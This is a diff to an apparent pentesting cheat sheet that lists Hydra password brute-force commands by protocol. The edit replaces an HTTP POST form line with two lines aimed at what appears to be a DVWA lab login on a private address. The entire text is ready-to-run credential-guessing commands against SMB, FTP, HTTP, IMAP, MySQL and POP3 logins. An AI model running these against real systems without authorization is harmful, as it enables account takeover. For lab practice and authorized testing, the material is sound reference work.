@@ -22,7 +22,8 @@
 | SMB       | hydra -l Administrator -P passwords.txt -f smb://10.0.2.5 -V |
 | FTP       | hydra -l root -P passwords.txt -f ftp://10.0.2.5 -V |
 | HTTP Basic Auth | hydra -L users.txt -P password.txt 10.0.2.5 http-get /login/ -V |
-| HTTP Post | hydra -L users.txt -P password.txt 10.0.2.5 http-post-form "/path/index.php:name=^USER^&password=^PASS^&enter=Sign+in:Login name or password is incorrect" -V |
+| HTTP Post | sudo hydra -l admin -P pass.txt 192.168.182.129  http-post-form "/dvwa/login.php:username=^USER^&password=^PASS^&Login=Login:F=Login failed" -V|
+|HTTP get|sudo hydra -l admin -P pass.txt 192.168.182.129 http-get-form "/login.php:username=^USER^&password=^PASS^&Login=Login:F=Login failed" -V|
 | IMAP      | hydra -l root -P passwords.txt -f imap://10.0.2.5 -V |
 | MySQL     | hydra -L usernames.txt -P pass.txt -f mysql://10.0.2.5 -V |
 | POP3      | hydra -l USERNAME -P passwords.txt -f pop3://10.0.2.5 -V |
